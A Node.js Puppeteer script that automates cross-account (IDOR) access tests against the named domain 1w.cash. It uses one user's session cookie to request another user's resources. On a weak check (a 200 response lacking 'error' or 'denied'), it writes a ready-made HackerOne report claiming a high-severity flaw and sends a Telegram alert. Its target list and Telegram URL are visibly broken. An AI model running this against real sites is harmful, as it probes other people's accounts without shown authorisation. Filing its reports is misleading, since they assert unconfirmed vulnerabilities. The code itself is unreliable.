const puppeteer = require('puppeteer');
const fs = require('fs');
const https = require('https');

// ---------------------------------------------------------
// TELEGRAM & SESSION CONFIGURATION PROFILE
// ---------------------------------------------------------
const TELEGRAM_BOT_TOKEN = 'YOUR_BOT_TOKEN_HERE';
const TELEGRAM_CHAT_ID = 'YOUR_CHAT_ID_HERE';

// Insert the authentication cookie details for USER B (The Attacker context)
const USER_B_COOKIE = {
    name: 'session_id',                 // Change to the exact cookie name found via F12
    value: 'COOKIE_VALUE_OF_USER_B',     // Change to User B's raw token value
    domain: '1w.cash',                   // The targeted domain name boundary
    path: '/'
};

// A list of parameters or endpoint patterns belonging strictly to USER A
const targetIdorUrls = [
    'https://1w.cash', // 98765 = User A's private ID
    'https://1w.cash',
    'https://1w.cash'
];
// ---------------------------------------------------------

function sendTelegramAlert(message) {
    const url = `https://telegram.org{TELEGRAM_BOT_TOKEN}/sendMessage`;
    const data = JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: message, parse_mode: 'Markdown' });
    const options = { method: 'POST', headers: { 'Content-Type': 'application/json', 'Content-Length': data.length } };
    const req = https.request(url, options, () => {});
    req.write(data);
    req.end();
}

function generateIdorReport(targetUrl, responseContent) {
    const reportFileName = `h1_report_IDOR_${Date.now()}.md`;
    const reportContent = 
`# Insecure Direct Object Reference (IDOR) on 1win Infrastructure

## Summary
An access control bypass vulnerability was identified within the application's account routing endpoint. The system verifies identity based on client-side numeric parameters rather than checking the active session state server-side, allowing authenticated users to access data belonging to other accounts.

## Vulnerability Type
* Broken Object Level Authorization / IDOR

## Affected Asset
* URL/Domain: ${targetUrl}

## Severity
* High (Enables horizontal privilege escalation and private data exposure)

## Steps to Reproduce
1. Log into an authorized account (User B).
2. Intercept or navigate directly to an endpoint reference explicitly mapped to a separate independent test profile (User A):
   \`${targetUrl}\`
3. Observe that the backend server ignores the authorization mismatch and returns User A's private object payload tree inside the server response body text.

## Proof of Concept (PoC)
The application returned data belonging to the targeted ID reference despite the request carrying an unrelated session identifier token.
`;

    fs.writeFileSync(reportFileName, reportContent);
    console.log(`[🎉 CRITICAL REPORT GENERATED!] IDOR markdown created at: ${reportFileName}`);
    sendTelegramAlert(`🚨 *IDOR VULNERABILITY DETECTED!* 🚨\n\n*Target Path:* ${targetUrl}\n\n📄 _HackerOne markdown file draft generated locally at: ${reportFileName}_`);
}

async function runIdorHunter() {
    console.log(`[+] Initializing Access Control Audit Sequence...`);
    const browser = await puppeteer.launch({ headless: true });

    for (let targetUrl of targetIdorUrls) {
        const page = await browser.newPage();
        let capturedResponseText = "";

        // 1. Force the page context to use User B's authentication identity cookies
        await page.setCookie(USER_B_COOKIE);

        page.on('response', async (response) => {
            if (response.url() === targetUrl) {
                try {
                    capturedResponseText = await response.text();
                } catch (err) {}
            }
        });

        try {
            console.log(`[*] Requesting User A's resource using User B's active session: ${targetUrl}`);
            const networkResponse = await page.goto(targetUrl, { waitUntil: 'networkidle2', timeout: 10000 });
            const HTTP_STATUS = networkResponse.status();

            // 2. LOGIC VERIFICATION: Analyze the server response behaviors
            // If the server returns 401 Unauthorized or 403 Forbidden, the endpoint is SECURE.
            // If it returns 200 OK, we must check if User A's content actually loaded.
            if (HTTP_STATUS === 200) {
                
                // CRITICAL LOGIC CHECK: Look inside the response data. 
                // If it contains markers specific to User A (like User A's username or email) 
                // instead of an error message like "Access Denied", an IDOR exists.
                if (!capturedResponseText.includes("error") && !capturedResponseText.includes("denied")) {
                    console.log(`[🚨 POTENTIAL IDOR BYPASS DETECTED] Server returned 200 OK for resource mismatch.`);
                    generateIdorReport(targetUrl, capturedResponseText);
                } else {
                    console.log(`[-] Path returned 200 but content indicates a soft authorization error rejection.`);
                }
            } else {
                console.log(`[+] Secure: Server rejected the cross-account request with HTTP Status: ${HTTP_STATUS}`);
            }

        } catch (error) {
            console.log(`[-] Connection dropped or resource timed out for path: ${targetUrl}`);
        } finally {
            await page.close();
        }
    }

    console.log(`\n[+] Access Control Audit Pipeline Complete.`);
    await browser.close();
}

runIdorHunter();
